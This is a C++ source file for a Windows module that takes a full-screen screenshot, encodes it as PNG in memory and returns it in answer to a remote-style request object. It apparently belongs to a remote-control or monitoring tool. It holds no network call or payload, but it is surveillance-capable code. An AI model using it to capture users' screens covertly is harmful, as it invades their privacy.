#include "SCR_Func.h"
#include <windows.h>
#include <tlhelp32.h>
#include <vector>
#include <string>
#include <sstream>
#include <d3d9.h>
#include <wincodec.h>
#include <wingdi.h>
#include <Windows.h>
#include "utils.h"

#include <gdiplus.h>
#pragma comment(lib, "Gdi32.lib")
#pragma comment(lib, "Gdiplus.lib")



std::vector<char> SCR_Func::takeScreenshot()
{
	HDC hScreenDC = GetDC(nullptr); // CreateDC("DISPLAY",nullptr,nullptr,nullptr);
	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

	// Get width and height of the current screen
	int width = GetDeviceCaps(hScreenDC, HORZRES);
	int height = GetDeviceCaps(hScreenDC, VERTRES);

	
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);
	HBITMAP hOldBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hBitmap));


	BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY);
	hBitmap = static_cast<HBITMAP>(SelectObject(hMemoryDC, hOldBitmap));
	DeleteDC(hMemoryDC);
	DeleteDC(hScreenDC);

	// Initialize GDI+
	Gdiplus::GdiplusStartupInput gdiplusStartupInput;
	ULONG_PTR gdiplusToken;
	Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, nullptr);

	// Save the bitmap to a file
	Gdiplus::Bitmap bitmap(hBitmap, nullptr);
	CLSID clsid;
	CLSIDFromString(L"{557CF406-1A04-11D3-9A73-0000F81EF32E}", &clsid); // PNG encoder
	
	std::vector<char> imageBuffer;
		IStream* pStream = nullptr;
	if (CreateStreamOnHGlobal(nullptr, TRUE, &pStream) == S_OK) {
		// Save the bitmap to the stream
		if (bitmap.Save(pStream, &clsid) == Gdiplus::Ok) {
			// Get the size of the stream
			LARGE_INTEGER li = {};
			ULARGE_INTEGER uliSize = {};
			pStream->Seek(li, STREAM_SEEK_CUR, &uliSize);

			// Reset the stream position to the beginning
			ULARGE_INTEGER uliPos = {};
			li.QuadPart = 0;
			pStream->Seek(li, STREAM_SEEK_SET, &uliPos);

			// Read the stream data into the vector
			DWORD dwBytesRead = 0;
			imageBuffer.resize(static_cast<size_t>(uliSize.QuadPart));
			pStream->Read(imageBuffer.data(), static_cast<ULONG>(uliSize.QuadPart), &dwBytesRead);
		}

		// Release the stream
		pStream->Release();
	}

	return imageBuffer;
}

std::shared_ptr<DataObj> SCR_Func::HandleRequest(DataObj request)
{
	std::shared_ptr<DataObj> response(new DataObj(utils::CurrentTime(), RESPONSE, SCR, CMD_TYPE, ""));
	if (request.getDataType() != REQUEST || request.getFuncType() != SCR)
	{
		response->setData("Wrong request format");
		return response;
	}

	if (request.getCmdType() == START)
	{
		response->setData(this->takeScreenshot());
		response->setCmdType(DATA);
		return response;
	}
	else
	{
		response->setData("Screen capture stopped.");
		response->setCmdType(DATA);
		return response;
	}
}
